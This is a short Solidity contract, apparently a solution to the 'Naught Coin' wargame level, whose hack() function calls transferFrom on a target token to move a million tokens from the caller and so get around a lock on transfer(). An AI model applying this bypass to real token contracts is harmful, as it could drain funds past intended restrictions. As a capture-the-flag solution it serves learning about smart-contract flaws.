// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract NaughtCoinHack {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function hack() external {
        target.call(abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            msg.sender,
            address(this),
            1000000 * (10**18)
        ));
    }
}
